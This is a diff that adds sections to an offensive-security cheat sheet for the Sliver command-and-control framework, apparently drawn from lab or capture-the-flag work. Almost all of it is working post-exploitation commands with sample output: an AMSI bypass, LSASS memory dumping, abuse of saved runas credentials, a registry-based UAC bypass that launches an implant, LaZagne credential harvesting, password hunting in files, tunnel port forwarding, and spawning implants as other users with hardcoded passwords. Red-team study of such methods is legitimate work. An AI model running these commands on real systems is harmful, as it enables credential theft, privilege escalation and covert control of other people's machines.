@@ -520,3 +520,175 @@ rm 20240503015529_BloodHound.zip
 ```
 execute -o tcpdump -n -i any "not host 172.16.1.100" -w /dev/shm/out.pcap -G 600
 ```
+
+### sharpsh — PowerShell via .NET RunspaceFactory
+
+Execute PowerShell commands through C# RunspaceFactory. Use `-M` for AMSI bypass and `-i` to run in-process:
+
+```
+sharpsh -M -i -- "-c whoami"
+
+[*] sharpsh output:
+nt authority\system
+```
+
+### Shell Management
+
+Detach from an interactive shell with `CTRL+]` (not CTRL+C):
+
+```
+PS C:\> ^]
+Shell detached
+```
+
+List and kill shells:
+
+```
+shell ls
+
+ ID   State      Session                                                 PID    PTY
+==== ========== ======================================================= ====== =======
+  1   detached   HUGE_MILKSHAKE (f44906cb-6562-4aef-a975-844fd782ae19)   5496   false
+
+shell kill 1
+[*] Shell 1 killed
+```
+
+### Dump LSASS with procdump
+
+Use `procdump` to dump LSASS memory, then parse offline with pypykatz:
+
+```
+ps -e lsass.exe
+
+ Pid   Ppid   Executable
+===== ====== ============
+ 664   508    lsass.exe
+
+procdump -n lsass.exe -s /tmp/lsass.dmp -t 120
+[*] Process dump stored in: /tmp/lsass.dmp
+```
+
+Parse the dump on your attack machine:
+
+```bash
+pypykatz lsa minidump /tmp/lsass.dmp
+```
+
+### Stored Credentials and runas /savecred
+
+Check for stored credentials on the target:
+
+```
+execute -o cmd.exe /c 'cmdkey /list'
+
+Currently stored credentials:
+
+    Target: Domain:interactive=SRV01\mcharles
+    Type: Domain Password
+    User: SRV01\mcharles
+```
+
+If `Domain:interactive` is present, you can run a command as that user without knowing their cleartext password:
+
+```
+execute -o cmd.exe /c 'runas /savecred /user:SRV01\mcharles C:\Users\sadams\Desktop\sliver.exe'
+
+[*] Session 2c6931b7 HUGE_MILKSHAKE - 10.129.21.95:49675 (SRV01) - windows/amd64
+```
+
+### UAC Bypass via computerdefaults.exe (Non-Interactive)
+
+From a sliver session on a user in the Administrators group but at medium integrity:
+
+```
+execute -o cmd.exe /c 'reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "C:\Users\sadams\Desktop\sliver.exe" /f && start computerdefaults.exe'
+```
+
+A new elevated session will callback.
+
+### UAC Bypass via msconfig (Interactive / RDP)
+
+From an interactive logon (RDP) as a user in the Administrators group:
+
+1. Launch `C:\Windows\System32\msconfig.exe` — it auto-elevates
+2. Go to **Tools** tab
+3. Launch **Command Prompt**
+4. You are now high-integrity and can run mimikatz/other post-exploitation tools
+
+### Sliver BOFs — Argument Separator
+
+When passing arguments to BOFs in sliver, use `--` to separate sliver flags from BOF arguments:
+
+```
+sa-vssenum -t 60 -- -hostname=DC01
+```
+
+### Volume Shadow Copies via Sliver
+
+```
+execute -o cmd.exe /c "vssadmin CREATE SHADOW /For=C:"
+
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {4e29f41c-a1ee-4d6f-9f30-9fed439df3be}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+execute -o cmd.exe /c "vssadmin list shadows"
+```
+
+### lazagne — Credential Harvesting
+
+Upload and run [lazagne](https://github.com/AlessandroZ/LaZagne) to dump all credentials from the system:
+
+```
+upload /opt/bin/lazagne.exe
+execute -t 240 -o lazagne.exe all -v
+```
+
+Reference: [sliver-cheatsheet lazagne](https://github.com/Anon-Exploiter/sliver-cheatsheet?tab=readme-ov-file#lazagne)
+
+### Port Forwarding with Bind Address
+
+Bind to all interfaces (`0.0.0.0`) to allow other tools to connect through the tunnel:
+
+```
+portfwd add -b 0.0.0.0:4445 -r 172.16.1.10:445
+
+[*] Port forwarding 0.0.0.0:4445 -> 172.16.1.10:445
+```
+
+**Important:** When using netexec or other multi-threaded tools through sliver tunnels, use `-t 1` to limit threads and avoid killing the tunnel:
+
+### Credential Hunting from Sliver
+
+Search for passwords in files across the file system:
+
+```
+execute -o cmd.exe /c 'findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml'
+execute -o cmd.exe /c 'findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml'
+execute -o cmd.exe /c 'findstr /SIM /C:"config" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml'
+```
+
+List files of interest recursively:
+
+```
+execute -o cmd.exe /c 'dir /S /B *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml'
+```
+
+### Spawn Process as Different User (Multiple Methods)
+
+**Method 1: runas via cmd.exe**
+
+```
+runas -d DOMAIN -u USERNAME -P 'PASSWORD' -p 'C:\path\to\sliver.exe' -n
+```
+
+**Method 2: PowerShell Start-Process**
+
+```powershell
+$username = "jbader"
+$password = ConvertTo-SecureString "ILovePower333###" -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential ($username, $password)
+Start-Process "C:\path\to\sliver.exe" -Credential $credential
+```
+
